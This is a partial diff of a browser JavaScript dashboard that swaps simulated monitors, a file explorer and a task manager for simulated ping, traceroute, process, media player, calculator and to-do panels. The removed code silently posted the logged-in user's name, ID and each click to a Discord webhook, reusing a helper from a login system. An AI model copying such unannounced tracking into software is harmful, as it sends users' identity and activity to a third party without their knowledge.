-          link.href = canvas.toDataURL('image/png'); // Get data URL from canvas
+          link.download = 'notes_canvas.png';
+          link.href = canvas.toDataURL('image/png');
           link.click();
-          // Log the action
-          this.logSystemActivity('Notes Canvas Exported');
         });
 
-        const toggleBtn = document.getElementById('toggleSectionsBtn');
+        // Toggle sections button logic
         toggleBtn.addEventListener('click', () => {
-          // Toggle visibility of the main content grid
-          if (mainGrid.style.display === 'none' || mainGrid.style.display === '') {
+          if (mainGrid.style.display === 'none' && canvasContainer.style.display === 'none') {
+            // If both are hidden, show mainGrid by default
             mainGrid.style.display = 'flex';
-            toggleBtn.innerHTML = '⬆️ Hide Sections'; // Update button text
-          } else {
+            toggleBtn.innerText = '⬆️ Toggle Sections';
+            // Animate main grid in
+            mainGrid.style.opacity = 0;
+            mainGrid.style.transform = 'translateY(30px)';
+            requestAnimationFrame(() => {
+              mainGrid.style.transition = 'opacity 0.8s ease-out 0.5s, transform 0.8s ease-out 0.5s';
+              mainGrid.style.opacity = 1;
+              mainGrid.style.transform = 'translateY(0)';
+            });
+          } else if (mainGrid.style.display !== 'none') {
+            // If mainGrid is visible, hide it
             mainGrid.style.display = 'none';
-            toggleBtn.innerHTML = '⬇️ Show Sections';
+            toggleBtn.innerText = '⬇️ Toggle Sections';
+          } else {
+            // If canvas is visible, show mainGrid
+            canvasContainer.style.display = 'none';
+            mainGrid.style.display = 'flex';
+            toggleBtn.innerText = '⬆️ Toggle Sections';
+             // Animate main grid in
+            mainGrid.style.opacity = 0;
+            mainGrid.style.transform = 'translateY(30px)';
+            requestAnimationFrame(() => {
+              mainGrid.style.transition = 'opacity 0.8s ease-out 0.5s, transform 0.8s ease-out 0.5s';
+              mainGrid.style.opacity = 1;
+              mainGrid.style.transform = 'translateY(0)';
+            });
           }
         });
       },
       
-      // Initialize all panels to be hidden by default
+      // Initialize panels, setting initial state
       initPanels: function() {
+        // Hide all info panels by default
         document.querySelectorAll('.info-panel').forEach(panel => {
           panel.style.display = 'none';
+          this.isPanelVisible[panel.id] = false;
         });
-        // Also hide specific content within panels if they exist
-        document.querySelectorAll('.ipad-content').forEach(content => {
-          content.style.display = 'none';
-        });
-        document.querySelectorAll('.bypass-content').forEach(content => {
+        // Hide all content within ipad/bypass panels
+        document.querySelectorAll('.ipad-content, .bypass-content').forEach(content => {
           content.style.display = 'none';
         });
       },
       
-      // Initialize Quick Bar (mostly handled by panel toggles)
+      // Initialize quick bar buttons (add event listeners for new ones)
       initQuickBar: function() {
-        // Buttons in the quick bar that toggle panels call dashboard.togglePanel directly.
-        // No additional initialization needed here for the existing structure.
+        // --- System Status Buttons ---
+        document.getElementById('systemStatusBtn').addEventListener('click', () => {
+          this.togglePanel('systemMonitorPanel');
+        });
+
+        // These buttons will update their text with simulated data
+        // The intervals are managed in initSystemMonitors
       },
       
-      // Generic function to toggle the display of any panel
+      // Panel toggle function
       togglePanel: function(panelId) {
         const panel = document.getElementById(panelId);
-        if (panel) {
-          const isHidden = panel.style.display === 'none' || panel.style.display === '';
-          panel.style.display = isHidden ? 'block' : 'none';
-          // Log the panel toggle action
-          if (isHidden) {
-            this.logSystemActivity(`Opened Panel: ${panelId}`);
-          } else {
-            this.logSystemActivity(`Closed Panel: ${panelId}`);
-          }
+        const isVisible = this.isPanelVisible[panelId];
+
+        // Hide all other panels of the same type if one is opened
+        if (!isVisible) {
+          document.querySelectorAll('.info-panel').forEach(p => {
+            if (p.id !== panelId && p.style.display !== 'none') {
+              p.style.display = 'none';
+              this.isPanelVisible[p.id] = false;
+            }
+          });
+        }
+        
+        panel.style.display = isVisible ? 'none' : 'block';
+        this.isPanelVisible[panelId] = !isVisible;
+
+        // Add animation on show
+        if (!isVisible) {
+          panel.style.opacity = 0;
+          panel.style.transform = 'translateY(20px)';
+          requestAnimationFrame(() => {
+            panel.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
+            panel.style.opacity = 1;
+            panel.style.transform = 'translateY(0)';
+          });
         }
       },
       
-      // Show specific content within the iPad panel
+      // iPad content toggle
       showIpadContent: function(contentId) {
-        // Hide all ipad-content elements first
+        const contentElementId = 'ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1);
+        const contentElement = document.getElementById(contentElementId);
+        
         document.querySelectorAll('.ipad-content').forEach(content => {
-          content.style.display = 'none';
+          if (content.id !== contentElement.id) {
+            content.style.display = 'none';
+          }
         });
-        // Show the requested content
-        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
-        if (targetContent) {
-          targetContent.style.display = 'block';
-          this.logSystemActivity(`Accessed iPad content: ${contentId}`);
-        }
+        contentElement.style.display = contentElement.style.display === 'none' ? 'block' : 'none';
       },
       
-      // Show specific content within the Bypass panel
+      // Bypass content toggle
       showBypassContent: function(contentId) {
-        // Hide all bypass-content elements first
+        const contentElementId = contentId + 'Bypass';
+        const contentElement = document.getElementById(contentElementId);
+        
         document.querySelectorAll('.bypass-content').forEach(content => {
-          content.style.display = 'none';
+          if (content.id !== contentElement.id) {
+            content.style.display = 'none';
+          }
         });
-        // Show the requested content
-        const targetContent = document.getElementById(contentId + 'Bypass');
-        if (targetContent) {
-          targetContent.style.display = 'block';
-          this.logSystemActivity(`Accessed Bypass content: ${contentId}`);
-        }
+        contentElement.style.display = contentElement.style.display === 'none' ? 'block' : 'none';
       },
 
-      // --- NEW SIMULATION AND INTERACTIVE FEATURE INITIALIZATION ---
+      // --- New Panel Specific Functions ---
 
-      // Initialize System Monitor (CPU, RAM, Disk)
-      initSystemMonitor: function() {
-        this.simulateSystemMetrics(); // Run once immediately
-        // Update metrics every 2 seconds
-        setInterval(() => this.simulateSystemMetrics(), 2000);
+      // System Monitor Initialization
+      initSystemMonitors: function() {
+        this.systemMonitorInterval = setInterval(() => this.updateSystemStats(), 3000); // Update every 3 seconds
+        this.updateSystemStats(); // Initial call
       },
 
-      // Simulate system resource usage
-      simulateSystemMetrics: function() {
-        const cpuUsage = Math.floor(Math.random() * 90) + 5; // 5-95%
-        const ramUsage = parseFloat((Math.random() * 6 + 1).toFixed(2)); // 1.00-7.00 GB
-        const diskUsage = Math.floor(Math.random() * 200) + 56; // 56-256 GB
-
-        // Update DOM elements
-        document.getElementById('simulatedCpu').textContent = cpuUsage;
-        document.getElementById('simulatedRam').textContent = ramUsage;
-        document.getElementById('simulatedDisk').textContent = diskUsage;
-
-        // Update progress bars
+      // Simulate System Stats
+      updateSystemStats: function() {
+        // Simulate CPU Usage (0-100%)
+        const cpuUsage = Math.floor(Math.random() * 50) + 20; // Between 20% and 70%
         const cpuBar = document.getElementById('cpuProgressBar');
-        const ramBar = document.getElementById('ramProgressBar');
-        const diskBar = document.getElementById('diskProgressBar');
-
+        const cpuValue = document.getElementById('cpuValue');
+        const cpuStatus = document.getElementById('cpuStatus');
         cpuBar.style.width = `${cpuUsage}%`;
-        ramBar.style.width = `${(ramUsage / 8) * 100}%`; // Assuming 8GB total RAM
-        diskBar.style.width = `${(diskUsage / 256) * 100}%`; // Assuming 256GB total Disk
+        cpuValue.innerText = `${cpuUsage}%`;
+        cpuStatus.innerText = `${cpuUsage}%`;
+        cpuBar.className = 'progress-bar'; // Reset classes
+        if (cpuUsage > 70) cpuBar.classList.add('high');
+        else if (cpuUsage > 40) cpuBar.classList.add('medium');
+
+        // Simulate RAM Usage (0-100%)
+        const ramUsage = Math.floor(Math.random() * 40) + 40; // Between 40% and 80%
+        const ramBar = document.getElementById('ramProgressBar');
+        const ramValue = document.getElementById('ramValue');
+        const ramStatus = document.getElementById('ramStatus');
+        ramBar.style.width = `${ramUsage}%`;
+        ramValue.innerText = `${ramUsage}%`;
+        ramStatus.innerText = `${ramUsage}%`;
+        ramBar.className = 'progress-bar'; // Reset classes
+        if (ramUsage > 70) ramBar.classList.add('high');
+        else if (ramUsage > 50) ramBar.classList.add('medium');
+
+        // Simulate Disk Usage (0-100%)
+        const diskUsage = Math.floor(Math.random() * 30) + 60; // Between 60% and 90%
+        const diskBar = document.getElementById('diskProgressBar');
+        const diskValue = document.getElementById('diskValue');
+        const diskStatus = document.getElementById('diskStatus');
+        diskBar.style.width = `${diskUsage}%`;
+        diskValue.innerText = `${diskUsage}%`;
+        diskStatus.innerText = `${diskUsage}%`;
+        diskBar.className = 'progress-bar'; // Reset classes
+        if (diskUsage > 80) diskBar.classList.add('high');
+        else if (diskUsage > 65) diskBar.classList.add('medium');
+
+        // Simulate Network Speed
+        const networkSpeed = Math.floor(Math.random() * 200) + 50; // Between 50 and 250 Mbps
+        document.getElementById('networkSpeedValue').innerText = `${networkSpeed} Mbps`;
+        document.getElementById('networkSpeedValueStat').innerText = `${networkSpeed} Mbps`;
       },
 
-      // Initialize Network Monitor (Speed, Ping, Loss)
-      initNetworkMonitor: function() {
-        this.simulateNetworkMetrics(); // Run once immediately
-        // Update metrics every 3 seconds
-        setInterval(() => this.simulateNetworkMetrics(), 3000);
+      // Network Tools Initialization
+      initNetworkTools: function() {
+        this.fetchPublicIP(); // Fetch IP on load
       },
 
-      // Simulate network metrics
-      simulateNetworkMetrics: function() {
-        const downloadSpeed = Math.floor(Math.random() * 90) + 10; // 10-100 Mbps
-        const uploadSpeed = Math.floor(Math.random() * 50) + 5;   // 5-55 Mbps
-        const ping = Math.floor(Math.random() * 100) + 20;       // 20-120 ms
-        const packetLoss = Math.floor(Math.random() * 4);        // 0-3%
-
-        document.getElementById('simulatedDownload').textContent = downloadSpeed;
-        document.getElementById('simulatedUpload').textContent = uploadSpeed;
-        document.getElementById('simulatedPing').textContent = ping;
-        document.getElementById('simulatedLoss').textContent = packetLoss;
-      },
-
-      // Initialize File Explorer
-      initFileExplorer: function() {
-        // Dummy data for the file explorer
-        this.fileTreeData = {
-          name: "root",
-          type: "directory",
-          children: [
-            { name: "System", type: "directory", children: [
-              { name: "bin", type: "directory", children: [
-                { name: "systemctl", type: "file", size: "1.2MB", accessed: false },
-                { name: "kernel", type: "file", size: "50MB", accessed: false }
-              ]},
-              { name: "etc", type: "directory", children: [
-                { name: "passwd", type: "file", size: "4KB", accessed: false },
-                { name: "config.sys", type: "file", size: "10KB", accessed: false }
-              ]},
-              { name: "secret.txt", type: "file", size: "1KB", accessed: false } // Sensitive file
-            ]},
-            { name: "Users", type: "directory", children: [
-              { name: "admin", type: "directory", children: [
-                { name: "documents", type: "directory", children: [
-                  { name: "report.docx", type: "file", size: "150KB", accessed: false }
-                ]},
-                { name: "private.key", type: "file", size: "8KB", accessed: false } // Another sensitive file
-              ]},
-              { name: "guest", type: "directory", children: [
-                { name: "notes.txt", type: "file", size: "2KB", accessed: false }
-              ]}
-            ]},
-            { name: "README.md", type: "file", size: "1KB", accessed: false }
-          ]
-        };
-
-        this.renderFileTree(this.fileTreeData, document.getElementById('fileTree'));
-        // Add event listener for clicks within the file tree area
-        document.getElementById('fileTree').addEventListener('click', (e) => {
-          const target = e.target.closest('.file-item, .directory-item');
-          if (!target) return;
-
-          e.preventDefault(); // Prevent default link behavior if any
-
-          if (target.classList.contains('directory-item')) {
-            this.toggleDirectory(target);
-          } else if (target.classList.contains('file-item')) {
-            this.handleFileAction(target);
-          }
-        });
-      },
-
-      // Recursively render the file tree structure
-      renderFileTree: function(node, parentElement) {
-        const ul = document.createElement('ul');
-        
-        if (node.children) {
-          node.children.forEach(item => {
-            const li = document.createElement('li');
-            li.classList.add(item.type === 'directory' ? 'directory-item' : 'file-item');
-            li.setAttribute('data-name', item.name); // Store name for actions
-            li.setAttribute('data-type', item.type); // Store type
-
-            const nameSpan = document.createElement('span');
-            nameSpan.classList.add('item-name');
-            nameSpan.textContent = item.name;
-            li.appendChild(nameSpan);
-
-            if (item.type === 'file') {
-              const sizeSpan = document.createElement('span');
-              sizeSpan.classList.add('item-size');
-              sizeSpan.textContent = `(${item.size})`;
-              li.appendChild(sizeSpan);
-            } else { // Directory
-              li.classList.add('closed'); // Start as closed
-              li.innerHTML += '<ul></ul>'; // Placeholder for children
-            }
-            
-            ul.appendChild(li);
-          });
-        }
-        parentElement.appendChild(ul);
-      },
-
-      // Toggle directory expansion
-      toggleDirectory: function(directoryElement) {
-        const isClosed = directoryElement.classList.contains('closed');
-        directoryElement.classList.toggle('closed');
-        directoryElement.classList.toggle('expanded');
-        
-        // Find the child ul element
-        const childUl = directoryElement.querySelector(':scope > ul');
-        
-        // Log directory access
-        this.logSystemActivity(`Accessed Directory: ${directoryElement.getAttribute('data-name')}`);
-
-        // If it was closed and we need to render children (lazy loading for performance)
-        if (isClosed && childUl && childUl.children.length === 0) {
-            // Find the corresponding data in fileTreeData
-            const path = directoryElement.getAttribute('data-name'); // Simple path, could be improved
-            let currentNode = this.fileTreeData;
-            const segments = path.split('/'); // This needs to be smarter if nested folders are clicked
-            // For simplicity, assume path is direct child or needs careful traversal
-            // A more robust approach would involve traversing the tree data
-            // For now, let's assume `fileTreeData` is flat or we have a way to find it.
-            // In a real app, you'd pass down the current node data.
-            
-            // Let's find the node by name (simplified)
-            const findNodeByName = (name, nodeArray) => {
-                for(const node of nodeArray) {
-                    if(node.name === name) return node;
-                    if(node.children) {
-                        const found = findNodeByName(name, node.children);
-                        if(found) return found;
-                    }
-                }
-                return null;
-            }
-            // This requires a better way to get parent data. For this example, let's just render a fixed structure or rely on initial render.
-            // A better implementation: pass the node object itself to renderFileTree.
-            
-            // Simplified: If we just toggle, we need to ensure all children are present or render them on first open.
-            // The current renderFileTree renders all at once. So just toggling display is enough.
-            // We only need to log the access.
-        }
-      },
-
-      // Handle actions on files (e.g., simulated opening)
-      handleFileAction: function(fileElement) {
-        const fileName = fileElement.getAttribute('data-name');
-        const fileSize = fileElement.querySelector('.item-size').textContent;
-        
-        // Log the file access
-        this.logSystemActivity(`Accessed File: ${fileName} (${fileSize})`);
-
-        // Simulate opening the file (e.g., show details or a message)
-        // For sensitive files, trigger a specific log
-        if (fileName === 'secret.txt' || fileName === 'private.key') {
-          alert(`ALERT: Sensitive file '${fileName}' accessed! Logging activity.`);
-          // Additional specific logging for sensitive files
-          this.logSystemActivity(`SENSITIVE FILE ACCESS: ${fileName}`);
-        } else {
-          // For other files, show a simple confirmation
-          alert(`Simulating opening file: ${fileName}`);
-        }
-      },
-
-      // Initialize Task Manager
-      initTaskManager: function() {
-        this.processes = [ // Initial list of simulated processes
-          { id: 1, name: "System Idle Process", cpu: Math.floor(Math.random() * 5), ram: Math.floor(Math.random() * 2) },
-          { id: 2, name: "svchost.exe", cpu: Math.floor(Math.random() * 10), ram: Math.floor(Math.random() * 60) },
-          { id: 3, name: "explorer.exe", cpu: Math.floor(Math.random() * 5), ram: Math.floor(Math.random() * 80) },
-          { id: 4, name: "chrome.exe", cpu: Math.floor(Math.random() * 20), ram: Math.floor(Math.random() * 350) },
-          { id: 5, name: "background_task.js", cpu: Math.floor(Math.random() * 3), ram: Math.floor(Math.random() * 30) },
-          { id: 6, name: "network_monitor.exe", cpu: Math.floor(Math.random() * 4), ram: Math.floor(Math.random() * 20) },
-          { id: 7, name: "security_daemon", cpu: Math.floor(Math.random() * 2), ram: Math.floor(Math.random() * 15) },
-          { id: 8, name: "file_server.exe", cpu: Math.floor(Math.random() * 5), ram: Math.floor(Math.random() * 40) },
-          { id: 9, name: "updater.exe", cpu: Math.floor(Math.random() * 3), ram: Math.floor(Math.random() * 25) },
-          { id: 10, name: "audio_service", cpu: Math.floor(Math.random() * 2), ram: Math.floor(Math.random() * 18) },
-        ];
-        this.renderTaskList(); // Render the initial list
-        // Update task list every 5 seconds
-        setInterval(() => this.renderTaskList(), 5000);
-      },
-
-      // Render the list of processes in the Task Manager panel
-      renderTaskList: function() {
-        const taskList = document.querySelector('#taskManagerPanel .task-list');
-        taskList.innerHTML = ''; // Clear previous list
-
-        // Update simulated resource usage for existing processes
-        this.processes.forEach(process => {
-            process.cpu = Math.max(0, process.cpu + Math.floor(Math.random() * 5) - 2); // Random slight change
-            process.ram = Math.max(5, process.ram + Math.floor(Math.random() * 30) - 15); // Random slight change, min 5MB
-        });
-
-        this.processes.sort((a, b) => b.cpu - a.cpu); // Sort by CPU usage (descending)
-
-        this.processes.forEach(process => {
-          const taskItem = document.createElement('div');
-          taskItem.classList.add('task-item');
-          taskItem.setAttribute('data-id', process.id);
-
-          taskItem.innerHTML = `
-            <span class="task-name">${process.name}</span>
-            <span class="task-value">${process.cpu}%</span>
-            <span class="task-value">${process.ram} MB</span>
-            <button class="end-task-btn">End</button>
-          `;
-          taskList.appendChild(taskItem);
-        });
-
-        // Add event listeners to the "End" buttons
-        taskList.querySelectorAll('.end-task-btn').forEach(button => {
-          button.addEventListener('click', (e) => {
-            e.stopPropagation(); // Prevent triggering file explorer clicks if nested
-            const processId = parseInt(e.target.closest('.task-item').getAttribute('data-id'));
-            this.endProcess(processId);
-          });
-        });
-      },
-
-      // Simulate ending a process
-      endProcess: function(processId) {
-        const initialLength = this.processes.length;
-        this.processes = this.processes.filter(p => p.id !== processId);
-        
-        if (this.processes.length < initialLength) {
-          const processName = "Unknown Process"; // Find name before filtering for logging
-          const foundProcess = Array.from(document.querySelectorAll('.task-item')).find(item => parseInt(item.getAttribute('data-id')) === processId);
-          if(foundProcess) {
-              processName = foundProcess.querySelector('.task-name').textContent;
-          }
-          this.logSystemActivity(`Terminated Process: ${processName} (ID: ${processId})`);
-          this.renderTaskList(); // Re-render the list
-        }
-      },
-
-      // Initialize System Information Panel
-      initSystemInfo: function() {
-        // Get logged-in username from the dashboard header and display it
-        const loggedInUserSpan = document.getElementById('loggedInUser');
-        const sysInfoUserName = document.getElementById('sysInfoUserName');
-        if (loggedInUserSpan && sysInfoUserName) {
-          sysInfoUserName.textContent = loggedInUserSpan.textContent;
-        }
-        this.logSystemActivity('Accessed System Information');
-      },
-
-      // Helper function to log activities via webhook
-      logSystemActivity: function(activityDescription) {
-        const loggedInUser = document.getElementById('loggedInUser').textContent;
-        const loggedInID = document.getElementById('loggedInID').textContent;
-        const now = new Date();
-
-        // Use a placeholder webhook for simulated activities
-        // IMPORTANT: Replace with your actual webhook URL if needed for real logging.
-        const webhookUrl = 'https://discord.com/api/webhooks/1403500000000000000/SIMULATED_ACTIVITY_TOKEN'; // Placeholder
-
-        const embed = {
-          title: "Dashboard Activity Log",
-          color: 0x3498db, // Blue color for general activities
-          fields: [
-            { name: "User", value: `${loggedInUser} (ID: ${loggedInID})`, inline: true },
-            { name: "Activity", value: activityDescription, inline: false },
-            { name: "Timestamp", value: now.toLocaleString(), inline: true }
-          ],
-          footer: { text: "Simulated System Activity" }
-        };
-
-        // Send the webhook (using the same sendWebhook logic as login system)
-        this.sendWebhook(webhookUrl, embed);
-      },
-
-      // Re-use sendWebhook from login system to send logs
-      sendWebhook: async function(url, embed) {
+      // Fetch Public IP (simulated)
+      fetchPublicIP: async function() {
         try {
-          await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] }),
-          });
-        } catch (e) {
-          console.warn('Simulated webhook send failed:', e);
+          // In a real scenario, you'd fetch from an API like ipify.org
+          // For simulation, we'll use dummy data.
+          const response = await new Promise(resolve => setTimeout(() => resolve({
+            json: () => Promise.resolve({ ip: '192.168.1.100', isp: 'Simulated ISP', location: 'Virtual City, USA' })
+          }), 500)); // Simulate network delay
+
+          const data = await response.json();
+          document.getElementById('publicIp').innerText = data.ip;
+          document.getElementById('isp').innerText = data.isp;
+          document.getElementById('location').innerText = data.location;
+        } catch (error) {
+          console.error("Failed to fetch IP info:", error);
+          document.getElementById('publicIp').innerText = 'Error';
+          document.getElementById('isp').innerText = 'Error';
+          document.getElementById('location').innerText = 'Error';
         }
       },
-    }; // End of dashboard object
+
+      // Simulate Ping
+      simulatePing: function() {
+        const target = document.getElementById('pingTarget').value || 'google.com';
+        const resultDiv = document.getElementById('pingResult');
+        resultDiv.innerHTML = `Pinging ${target}...`;
+        
+        // Simulate ping results
+        setTimeout(() => {
+          const delay = Math.floor(Math.random() * 50) + 10; // 10-60ms
+          const loss = Math.random() < 0.05 ? 100 : 0; // 5% packet loss chance
+          
+          if (loss === 100) {
+            resultDiv.innerHTML = `Ping statistics for ${target}:\nPackets: Sent = 4, Received = 0, Lost = 4 (100% loss)`;
+          } else {
+            resultDiv.innerHTML = `Ping statistics for ${target}:\nPackets: Sent = 4, Received = 4, Lost = 0 (0% loss)\nApproximate round trip times in milli-seconds:\n    Minimum = ${delay - 5}ms, Maximum = ${delay + 5}ms, Average = ${delay}ms`;
+          }
+        }, 1000); // Simulate ping taking 1 second
+      },
+
+      // Simulate Traceroute
+      simulateTraceroute: function() {
+        const target = document.getElementById('tracerouteTarget').value || 'google.com';
+        const resultDiv = document.getElementById('tracerouteResult');
+        resultDiv.innerHTML = `Tracing route to ${target} over a maximum of 30 hops:\n\n`;
+        
+        // Simulate traceroute hops
+        let hop = 1;
+        const maxHops = 10; // Simulate fewer hops for brevity
+        const interval = 300; // ms between hops
+
+        const traceInterval = setInterval(() => {
+          if (hop > maxHops) {
+            clearInterval(traceInterval);
+            resultDiv.innerHTML += `\nTrace complete.`;
+            return;
+          }
+          const ip = `192.168.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 255)}`;
+          const delay1 = Math.floor(Math.random() * 20) + 5;
+          const delay2 = Math.floor(Math.random() * 20) + 5;
+          const delay3 = Math.floor(Math.random() * 20) + 5;
+          
+          resultDiv.innerHTML += `${hop}    ${ip}  [${delay1}ms] [${delay2}ms] [${delay3}ms]\n`;
+          hop++;
+        }, interval);
+      },
+
+      // Task Manager Initialization
+      initTaskManager: function() {
+        this.processUpdateInterval = setInterval(() => this.updateProcessList(), 5000); // Update processes every 5 seconds
+        this.updateProcessList(); // Initial load
+      },
+
+      // Simulate Process List
+      updateProcessList: function() {
+        const processListDiv = document.getElementById('processList');
+        processListDiv.innerHTML = ''; // Clear existing
+        
+        const processes = [
+          { name: "System Idle Process", cpu: Math.floor(Math.random() * 5) + 0, mem: "0.1%" },
+          { name: "svchost.exe", cpu: Math.floor(Math.random() * 15) + 5, mem: "50MB" },
+          { name: "explorer.exe", cpu: Math.floor(Math.random() * 10) + 2, mem: "70MB" },
+          { name: "chrome.exe", cpu: Math.floor(Math.random() * 25) + 10, mem: "250MB" },
+          { name: "dashboard.exe", cpu: Math.floor(Math.random() * 10) + 1, mem: "30MB" },
+          { name: "audiodg.exe", cpu: Math.floor(Math.random() * 5) + 0, mem: "5MB" },
+          { name: "msedge.exe", cpu: Math.floor(Math.random() * 20) + 8, mem: "180MB" },
+          { name: "powershell.exe", cpu: Math.floor(Math.random() * 8) + 1, mem: "15MB" },
+        ];
+
+        processes.forEach((proc, index) => {
+          const procElement = document.createElement('div');
+          procElement.classList.add('process-item');
+          procElement.innerHTML = `
+            <div class="process-name">${proc.name}</div>
+            <div class="process-usage">${proc.cpu}%</div>
+            <div class="process-usage">${proc.mem}</div>
+            <button class="kill-btn" onclick="dashboard.killProcess(${index})">Kill</button>
+          `;
+          processListDiv.appendChild(procElement);
+        });
+      },
+
+      killProcess: function(index) {
+        // Simulate killing a process
+        const processName = document.getElementById('processList').children[index].querySelector('.process-name').innerText;
+        if (confirm(`Are you sure you want to terminate "${processName}"?`)) {
+          alert(`Process "${processName}" has been terminated (simulated).`);
+          this.updateProcessList(); // Refresh list after simulated kill
+        }
+      },
+
+      // File Explorer Initialization
+      initFileExplorer: function() {
+        // File explorer content is static for now, no dynamic init needed
+      },
+
+      // Media Player Initialization
+      initMediaPlayer: function() {
+        this.mediaPlayerState = {
+          songs: [
+            { title: "Ambient Focus", src: "ambient_focus.mp3", artist: "AI Composer" },
+            { title: "Synthwave Vibes", src: "synthwave.mp3", artist: "Retro Wave" },
+            { title: "Chillhop Beats", src: "chillhop.mp3", artist: "Lo-fi Producer" }
+          ],
+          currentSongIndex: 0,
+          isPlaying: false,
+          progressInterval: null
+        };
+        this.loadMedia(this.mediaPlayerState.currentSongIndex);
+      },
+
+      loadMedia: function(index) {
+        const song = this.mediaPlayerState.songs[index];
+        const mediaDisplay = document.getElementById('mediaDisplay');
+        const mediaTitle = document.getElementById('mediaTitle');
+        const playPauseBtn = document.querySelector('#mediaPlayerPanel .controls button[onclick="dashboard.mediaControl(\'playPause\')"]');
+        const mediaProgress = document.getElementById('mediaProgress');
+
+        mediaDisplay.innerHTML = `Playing: ${song.title}`;
+        mediaTitle.innerText = `${song.title} - ${song.artist}`;
+        mediaProgress.style.width = '0%'; // Reset progress
+
+        // Reset play/pause button to play icon
+        playPauseBtn.innerHTML = '▶️';
+        this.mediaPlayerState.isPlaying = false;
+
+        clearInterval(this.mediaPlayerState.progressInterval);
+      },
+
+      mediaControl: function(action) {
+        const song = this.mediaPlayerState.songs[this.mediaPlayerState.currentSongIndex];
+        const playPauseBtn = document.querySelector('#mediaPlayerPanel .controls button[onclick="dashboard.mediaControl(\'playPause\')"]');
+        const mediaDisplay = document.getElementById('mediaDisplay');
+        const mediaProgress = document.getElementById('mediaProgress');
+        
+        switch (action) {
+          case 'playPause':
+            this.mediaPlayerState.isPlaying = !this.mediaPlayerState.isPlaying;
+            if (this.mediaPlayerState.isPlaying) {
+              playPauseBtn.innerHTML = '⏸️'; // Pause icon
+              mediaDisplay.innerHTML = `Playing: ${song.title}`;
+              // Simulate progress
+              let currentProgress = 0;
+              this.mediaPlayerState.progressInterval = setInterval(() => {
+                currentProgress += 5; // Increment by 5%
+                if (currentProgress > 100) {
+                  currentProgress = 100;
+                  this.mediaControl('next'); // Auto play next when done
+                }
+                mediaProgress.style.width = `${currentProgress}%`;
+              }, 500); // Update every 0.5 seconds
+            } else {
+              playPauseBtn.innerHTML = '▶️'; // Play icon
+              mediaDisplay.innerHTML = `Paused: ${song.title}`;
+              clearInterval(this.mediaPlayerState.progressInterval);
+            }
+            break;
+          case 'next':
+            clearInterval(this.mediaPlayerState.progressInterval);
+            this.mediaPlayerState.currentSongIndex = (this.mediaPlayerState.currentSongIndex + 1) % this.mediaPlayerState.songs.length;
+            this.loadMedia(this.mediaPlayerState.currentSongIndex);
+            if (this.mediaPlayerState.isPlaying) this.mediaControl('playPause'); // auto-play next
+            break;
+          case 'prev':
+            clearInterval(this.mediaPlayerState.progressInterval);
+            this.mediaPlayerState.currentSongIndex = (this.mediaPlayerState.currentSongIndex - 1 + this.mediaPlayerState.songs.length) % this.mediaPlayerState.songs.length;
+            this.loadMedia(this.mediaPlayerState.currentSongIndex);
+            if (this.mediaPlayerState.isPlaying) this.mediaControl('playPause'); // auto-play prev
+            break;
+        }
+      },
+
+      // Calculator Initialization
+      initCalculator: function() {
+        this.calculatorState = {
+          displayValue: '0',
+          firstOperand: null,
+          operator: null,
+          waitingForSecondOperand: false
+        };
+        this.updateCalculatorDisplay();
+      },
+
+      calculator: function(key) {
+        const state = this.calculatorState;
+        const display = document.getElementById('calcDisplay');
+
+        if (!isNaN(key)) { // Number pressed
+          if (state.waitingForSecondOperand) {
+            state.displayValue = key;
+            state.waitingForSecondOperand = false;
+          } else {
+            state.displayValue = state.displayValue === '0' ? key : state.displayValue + key;
+          }
+        } else if (key === '.') { // Decimal point
+          if (state.waitingForSecondOperand) {
+             state.displayValue = '0.';
+             state.waitingForSecondOperand = false;
+          } else if (!state.displayValue.includes('.')) {
+            state.displayValue += '.';
+          }
+        } else if (key === '+/-') { // Sign change
+            state.displayValue = parseFloat(state.displayValue) * -1;
+        } else if (key === '+') { // Addition
+          this.handleOperator(key);
+        } else if (key === '-') { // Subtraction
+          this.handleOperator(key);
+        } else if (key === '*') { // Multiplication
+          this.handleOperator(key);
+        } else if (key === '/') { // Division
+          this.handleOperator(key);
+        } else if (key === '=') { // Equals
+          if (state.firstOperand == null || state.operator == null || state.waitingForSecondOperand) {
+            // Do nothing if not enough info or pressing equals multiple times
+            return;
+          }
+          const result = this.calculate(state.firstOperand, parseFloat(state.displayValue), state.operator);
+          state.displayValue = String(result);
+          state.firstOperand = null;
+          state.operator = null;
+          state.waitingForSecondOperand = false;
+        } else if (key === 'AC') { // All Clear
+          state.displayValue = '0';
+          state.firstOperand = null;
+          state.operator = null;
+          state.waitingForSecondOperand = false;
+        } else if (key === 'DEL') { // Delete last character
+            if (state.displayValue.length > 1) {
+                state.displayValue = state.displayValue.slice(0, -1);
+            } else {
+                state.displayValue = '0';
+            }
+        }
+        this.updateCalculatorDisplay();
+      },
+
+      handleOperator: function(nextOperator) {
+          const state = this.calculatorState;
+          const inputValue = parseFloat(state.displayValue);
+
+          if (state.operator && state.waitingForSecondOperand)  {
+              state.operator = nextOperator;
+              return;
+          }
+
+          if (state.firstOperand == null) {
+              state.firstOperand = inputValue;
+          } else if (state.operator) {
+              const result = this.calculate(state.firstOperand, inputValue, state.operator);
+              state.displayValue = String(result);
+              state.firstOperand = result;
+          }
+
+          state.waitingForSecondOperand = true;
+          state.operator = nextOperator;
+      },
+
+      calculate: function(first, second, operator) {
+          switch (operator) {
+              case '+': return first + second;
+              case '-': return first - second;
+              case '*': return first * second;
+              case '/': return first / second;
+              default: return second;
+          }
+      },
+
+      updateCalculatorDisplay: function() {
+        document.getElementById('calcDisplay').innerText = this.calculatorState.displayValue;
+      },
+
+      // To-Do List Initialization
+      initTodoList: function() {
+        this.todoList = []; // Store tasks in an array
+        const addTodoBtn = document.getElementById('addTodoBtn');
+        const todoInput = document.getElementById('todoInput');
+
+        addTodoBtn.addEventListener('click', () => this.addTodoItem());
+        todoInput.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') this.addTodoItem();
+        });
+        this.loadTodoItems(); // Load any existing tasks (simulated)
+      },
+
+      addTodoItem: function() {
+        const todoInput = document.getElementById('todoInput');
+        const taskText = todoInput.value.trim();
+        if (taskText) {
+          this.todoList.push({ text: taskText, completed: false });
+          this.renderTodoList();
